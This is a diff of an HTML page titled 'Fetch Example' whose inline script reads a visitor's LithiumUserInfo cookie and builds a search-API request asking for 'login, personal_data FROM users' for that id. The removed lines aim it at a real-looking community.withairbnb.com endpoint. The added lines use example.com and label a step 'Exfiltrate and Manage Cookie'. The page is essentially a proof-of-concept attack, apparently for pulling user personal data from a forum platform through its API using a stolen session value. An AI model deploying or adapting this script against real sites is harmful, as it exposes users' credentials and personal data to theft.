@@ -6,27 +6,63 @@
     <title>Fetch Example</title>
 </head>
 <body>
+    <h1>Loading...</h1>
     <script>
-        // Get the value of the user id
-        const cookieValue = document.cookie
-            .split('; ')
-            .find(row => row.startsWith('LithiumUserInfo='))
-            .split('=')[1];
+        // Step 1: Make a fetch request to example.com
+        const apiUrl = 'https://example.com';
+        
+        console.log('Step 1: Making a fetch request to example.com');
 
-        // Construct the URL with the cookie value
-        const apiUrl = `https://community.withairbnb.com/unqgh87863/api/2.0/search?q=SELECT+login,+personal_data+FROM+users+where+id%3d+'${encodeURIComponent(cookieValue)}'`;
-
-        // Make a fetch request
         fetch(apiUrl)
-            .then(response => response.json())
-            .then(data => {
-                console.log('Response:', data);
-                // Handle the response data as needed
+            .then(response => {
+                console.log('Step 1: Fetch to example.com successful:', response);
+                // Continue with Step 2: Exfiltrate and manage cookie
+                exfiltrateAndManageCookie();
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('Step 1: Error fetching from example.com:', error);
                 // Handle errors
             });
+
+        // Step 2: Exfiltrate and Manage Cookie
+        function exfiltrateAndManageCookie() {
+            console.log('Step 2: Exfiltrating and managing the LithiumUserInfo cookie');
+
+            // Get the value of the LithiumUserInfo cookie
+            const cookieValue = document.cookie
+                .split('; ')
+                .find(row => row.startsWith('LithiumUserInfo='))
+                ?.split('=')[1];
+
+            if (cookieValue) {
+                console.log('Step 2: LithiumUserInfo cookie value:', cookieValue);
+                // Continue with Step 3: Make request to the search endpoint
+                makeRequestToSearchEndpoint(cookieValue);
+            } else {
+                console.error('Step 2: LithiumUserInfo cookie not found.');
+                // Handle the case where the cookie is not found
+            }
+        }
+
+        // Step 3: Make Request to Search Endpoint
+        function makeRequestToSearchEndpoint(cookieValue) {
+            console.log('Step 3: Making a fetch request to the search endpoint');
+
+            // Construct the URL with the cookie value
+            const searchApiUrl = `https://example.com/unqgh87863/api/2.0/search?q=SELECT+login,+personal_data+FROM+users+where+id%3d+'${encodeURIComponent(cookieValue)}'`;
+
+            // Make a fetch request to the search endpoint
+            fetch(searchApiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Step 3: Response from search endpoint:', data);
+                    // Handle the response data as needed
+                })
+                .catch(error => {
+                    console.error('Step 3: Error making request to search endpoint:', error);
+                    // Handle errors
+                });
+        }
     </script>
 </body>
 </html>
